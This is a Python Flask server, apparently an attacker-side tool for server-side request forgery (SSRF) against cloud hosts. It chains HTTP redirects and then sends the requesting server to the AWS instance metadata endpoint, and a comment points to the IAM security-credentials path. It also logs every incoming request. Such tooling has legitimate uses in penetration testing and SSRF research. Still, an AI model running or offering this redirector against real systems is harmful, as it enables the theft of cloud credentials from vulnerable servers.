

from flask import Flask, request, redirect 
import ssl
import logging
from datetime import datetime

app = Flask(__name__)

# Logging configuration
logging.basicConfig(filename='/scripts/443.log', level=logging.DEBUG, format='%(message)s')

max_redirects = 7

def log_request(verb, path, remote_addr):
    timestamp = datetime.now().strftime('%d/%b/%Y %H:%M:%S')
    log_msg = f"{timestamp}|{remote_addr}|{verb} {path}| "
    logging.info(log_msg)



@app.route('/redir', methods=['GET', 'POST'])
def redir():
    global max_redirect # XXX this is very much not thread safe, but this isn't meant to be multi-user
    """Handle redirects with loop counter - after 10 redirects, go to final SSRF location."""
    # Get the current redirect count from query parameter, default to 0
    redirect_count = int(request.args.get('count', 0))

    # Increment the counter
    redirect_count += 1
    status_code = 301 + redirect_count
    # If we've reached 10 redirects, redirect to our desired location
    # To grab AWS metadata keys, you would hit http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name-here
    if redirect_count >= max_redirects:
        return redirect("http://169.254.169.254/latest/meta-data/", code=302)
    print("trying: " + str(status_code))
    # Otherwise, redirect back to /redir with incremented counter
    return redirect(f"/redir?count={redirect_count}", code=status_code)

@app.route('/start', methods=['POST', 'GET'])
def start():
    global max_redirects
    max_redirects = int(request.args.get('max_redirects', 11))
    """Starting point for redirect loop."""
    return redirect("/redir", code=302)



@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def catch_all(path):
    log_request(request.method, request.path, request.remote_addr)
    if request.method == 'GET':
        return f"GET {request.path}", 200
    elif request.method == 'POST':
        return f"POST {request.path}", 200

if __name__ == '__main__':
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='/scripts/server.pem')
    app.run(host='0.0.0.0', port=443, ssl_context=context)
